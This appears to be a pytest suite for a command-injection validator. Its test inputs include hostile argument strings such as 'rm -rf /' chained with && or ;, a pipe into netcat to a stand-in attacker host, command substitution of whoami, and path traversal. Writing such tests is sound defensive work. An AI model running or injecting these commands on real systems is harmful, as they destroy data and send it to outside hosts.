"""
Test Suite for Command Validator

Tests command injection prevention with legitimate inputs, edge cases, and
malicious attack vectors to ensure robust security.

Run with:
    pytest tests/security/test_command_validator.py -v
"""

import os
import sys

import pytest

from execution.security import CommandValidator, ValidationError


class TestCommandValidator:
    """Tests for command injection prevention"""

    def test_validate_simple_argument(self):
        """Test that simple arguments are accepted"""
        result = CommandValidator.validate_safe_argument("myfile.txt")
        assert result == "myfile.txt"

    def test_reject_command_chaining_ampersand(self):
        """Test that & command chaining is rejected"""
        with pytest.raises(ValidationError, match="dangerous character: &"):
            CommandValidator.validate_safe_argument("file.txt && rm -rf /")

    def test_reject_command_chaining_pipe(self):
        """Test that | pipe is rejected"""
        with pytest.raises(ValidationError, match="dangerous character: |"):
            CommandValidator.validate_safe_argument("file.txt | nc attacker.com 1234")

    def test_reject_command_chaining_semicolon(self):
        """Test that ; semicolon is rejected"""
        with pytest.raises(ValidationError, match="dangerous character: ;"):
            CommandValidator.validate_safe_argument("file.txt; rm -rf /")

    def test_reject_backtick_execution(self):
        """Test that backtick command execution is rejected"""
        with pytest.raises(ValidationError, match="dangerous character: `"):
            CommandValidator.validate_safe_argument("file_`whoami`.txt")

    def test_reject_dollar_sign_expansion(self):
        """Test that $() command substitution is rejected"""
        with pytest.raises(ValidationError, match=r"dangerous character: \$"):
            CommandValidator.validate_safe_argument("file_$(whoami).txt")

    def test_reject_redirection(self):
        """Test that I/O redirection is rejected"""
        with pytest.raises(ValidationError, match="dangerous character"):
            CommandValidator.validate_safe_argument("file.txt > /dev/null")

    def test_reject_very_long_argument(self):
        """Test that overly long arguments are rejected"""
        with pytest.raises(ValidationError, match="too long"):
            CommandValidator.validate_safe_argument("a" * 2000)

    def test_validate_command_path_simple(self):
        """Test that simple command paths are accepted"""
        result = CommandValidator.validate_command_path("python")
        assert result == "python"

    def test_validate_command_path_with_whitelist(self):
        """Test command path with whitelist"""
        result = CommandValidator.validate_command_path("python", allowed_commands=["python", "pip", "pytest"])
        assert result == "python"

    def test_reject_command_not_in_whitelist(self):
        """Test that commands not in whitelist are rejected"""
        with pytest.raises(ValidationError, match="not in whitelist"):
            CommandValidator.validate_command_path("malicious_command", allowed_commands=["python", "pip", "pytest"])

    def test_reject_command_path_traversal(self):
        """Test that path traversal in commands is rejected"""
        with pytest.raises(ValidationError, match="path traversal"):
            CommandValidator.validate_command_path("../../usr/bin/malicious")

    def test_validate_safe_argument_empty_string(self):
        """Test that empty string arguments are rejected"""
        with pytest.raises(ValidationError, match="cannot be empty"):
            CommandValidator.validate_safe_argument("")

    def test_validate_safe_argument_non_string(self):
        """Test that non-string arguments are converted"""
        result = CommandValidator.validate_safe_argument(123)  # type: ignore[arg-type]
        assert result == "123"

    def test_validate_safe_argument_null_byte(self):
        """Test that null bytes are rejected"""
        with pytest.raises(ValidationError, match="dangerous character"):
            CommandValidator.validate_safe_argument("file\x00.txt")

    def test_validate_safe_argument_newline(self):
        """Test that newlines are rejected"""
        with pytest.raises(ValidationError, match="dangerous character"):
            CommandValidator.validate_safe_argument("file\n.txt")

    def test_validate_safe_argument_carriage_return(self):
        """Test that carriage returns are rejected"""
        with pytest.raises(ValidationError, match="dangerous character"):
            CommandValidator.validate_safe_argument("file\r.txt")

    def test_validate_safe_argument_parentheses(self):
        """Test that parentheses are rejected"""
        with pytest.raises(ValidationError, match="dangerous character"):
            CommandValidator.validate_safe_argument("file(test).txt")

    def test_validate_safe_argument_less_than(self):
        """Test that < is rejected"""
        with pytest.raises(ValidationError, match="dangerous character"):
            CommandValidator.validate_safe_argument("file<input.txt")

    def test_validate_safe_argument_greater_than(self):
        """Test that > is rejected"""
        with pytest.raises(ValidationError, match="dangerous character"):
            CommandValidator.validate_safe_argument("file>output.txt")

    def test_validate_command_path_empty_string(self):
        """Test that empty command paths are rejected"""
        with pytest.raises(ValidationError, match="cannot be empty"):
            CommandValidator.validate_command_path("")

    def test_validate_command_path_full_path(self):
        """Test that full paths are accepted"""
        result = CommandValidator.validate_command_path("/usr/bin/python")
        assert result == "/usr/bin/python"

    def test_validate_command_path_basename_check(self):
        """Test that basename is checked against whitelist"""
        result = CommandValidator.validate_command_path("/usr/bin/python", allowed_commands=["python"])
        assert result == "/usr/bin/python"
